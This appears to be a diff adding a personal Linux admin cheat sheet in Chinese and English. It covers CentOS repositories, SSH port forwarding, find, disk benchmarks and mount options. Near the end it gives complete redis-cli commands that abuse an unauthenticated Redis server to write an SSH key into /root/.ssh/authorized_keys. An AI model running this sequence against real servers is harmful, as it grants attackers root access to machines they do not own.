@@ -1,0 +1,90 @@
+centos rpm useful :
+1.The ELRepo Project focuses on hardware related packages to enhance your experience with Enterprise Linux. This includes filesystem drivers, graphics drivers, network drivers, sound drivers, webcam and video drivers 同时也提供了正对centos5,6的long-term support kernels,以及cnetos6,7的 the latest stable mainline kernels.(kernel-lt and kernel-ml)
+rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-3.el7.elrepo.noarch.rpm (external link)
+rpm -Uvh http://www.elrepo.org/elrepo-release-6-8.el6.elrepo.noarch.rpm (external link)
+2.Extra Packages for Enterprise Linux (or EPEL) is a Fedora Special Interest Group that creates, maintains, and manages a high quality set of additional packages for Enterprise Linux
+rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm
+rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-6.noarch.rpm
+3.IUS Community Repo提供『最新版的上游 PHP、Python、MySQL 
+rpm -Uvh https://centos7.iuscommunity.org/ius-release.rpm
+rpm -Uvh https://centos6.iuscommunity.org/ius-release.rpm
+4.The Remi's RPM Providing the  latest versions of the PHP stack, full featured, and some other software
+rpm -Uvh https://rpms.remirepo.net/enterprise/remi-release-7.rpm
+rpm -Uvh https://rpms.remirepo.net/enterprise/remi-release-6.rpm
+5.The Software Collections ( SCL ) Repository
+The Software Collections SIG will provide an upstream development area for various software collections and related tools. Developers can build on and extend existing SCLs, so they don't need to re-invent the wheel or take responsibility for packaging unnecessary dependencies.
+yum install centos-release-scl
+too try python35 with scl:
+yum install rh-python35
+scl enable rh-python35
+scl enable rh-python35  "python3 --help"
+
+ssh tunnels:
+ssh -C -f -N -g -L listen_port:DST_Host:DST_port user@Tunnel_Host 
+ssh -C -f -N -g -R listen_port:DST_Host:DST_port user@Tunnel_Host 
+ssh -C -f -N -g -D listen_port user@Tunnel_Host
+-L port:host:hostport 
+将本地机(客户机)的某个端口转发到远端指定机器的指定端口. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 同时远程主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有 root 才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport
+-R port:host:hostport 
+将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. 工作原理是这样的, 远程主机上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转向出去, 同时本地主机和 host 的 hostport 端口建立连接. 可以在配置文件中指定端口的转发. 只有用 root 登录远程主机才能转发特权端口. IPv6 地址用另一种格式说明: port/host/hostport
+-D port 
+指定一个本地机器 “动态的’’ 应用程序端口转发. 工作原理是这样的, 本地机器上分配了一个 socket 侦听 port 端口, 一旦这个端口上有了连接, 该连接就经过安全通道转发出去, 根据应用程序的协议可以判断出远程主机将和哪里连接. 目前支持 SOCKS4 协议, 将充当 SOCKS4 服务器. 只有 root 才能转发特权端口. 可以在配置文件中指定动态端口的转发.
+
+
+until kctl get servicemonitor > /dev/null 2>&1; do sleep 1; printf "."; done
+
+find to exclude folders:
+find -not -path "./com/ozstrategy/*' -not -path "./com/cmc/*" -type f
+This command copies the contents of /source-dir to /dest-dir, but omits files and directories named .snapshot (and anything in them).  It also omits files or directories whose name ends in ~, but not their contents.  The construct -prune -o \( ... -print0 \) is quite common.  The idea here is that the expression before -prune  matches  things  which are  to  be  pruned.  However, the -prune action itself returns true, so the following -o ensures that the right hand side is evaluated only for those directories which didn't get pruned 
+下面的命令找出并复制当前目录中所有非名为.snapshot，以及名字不是已～结束的文件和目录到dest-dir
+find . -name .snapshot -prune -o \( \! -name *~ -print0 \)|   cpio -pmd0 /dest-dir
+
+设置一个文件的修改时间为epoch，On GNU and POSIX systems,the epoch is 1970-01-01 00:00:00 UTC, so '@0' represents this time，'@1' represents 1970-01-01 00:00:01 UTC
+touch -d "@0" file
+
+获取文件修改时间到现在的秒数time of last modification, seconds since Epoch
+stat --format "%Y" file
+
+
+test disk speed:
+measure server write speed
+dd if=/dev/zero of=/tmp/test1.img bs=1G count=1 oflag=dsync
+measure server latency 
+dd if=/dev/zero of=/tmp/test2.img bs=512 count=1000 oflag=dsync
+measure server read speed
+echo 3 > /proc/sys/vm/drop_caches &&time dd if=/path/to/bigfile of=/dev/null bs=8k
+
+Use hdparm command to see buffered and cached disk read speed
+## Cache read benchmark for /dev/sda ###
+hdparm -T /dev/sda1
+### Buffered disk read test for /dev/sda ##
+hdparm -t /dev/sda1
+
+
+hard link 不能跨硬盘的问题可以通过mount --bind 解决,同时mount --bind只会暂时隐藏目标文件的内容，在umount还会恢复原内容。
+
+一个mount目录可以有以下几种状态:
+ Mount states
+	A given mount can be in one of the following states
+	1) shared 
+mount --make-shared /mnt  
+mount --bind /mnt /tmp
+The mount at /mnt and that at /tmp are both shared and belong to the same peer group. Anything mounted or unmounted under /mnt or /tmp reflect in all the other mounts of its peer group.
+	2) slave
+	3) shared and slave
+	4) private
+	5) unbindable
+
+redis如果未开启验证则可能被通过save dbfilename来写入文件到机器
+$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n")|redis-cli -h 192.168.1.11 -x set crack 
+$ 192.168.1.11:6379> config set dir /root/.ssh/
+$ 192.168.1.11:6379> config get dir
+1) "dir"
+2) "/root/.ssh"
+$ 192.168.1.11:6379> config set dbfilename "authorized_keys"
+$ 192.168.1.11:6379> save
+
+ssh log:
+SyslogFacility AUTHPRIV
+
+command -v cmd #返回cmd命令的绝对路径
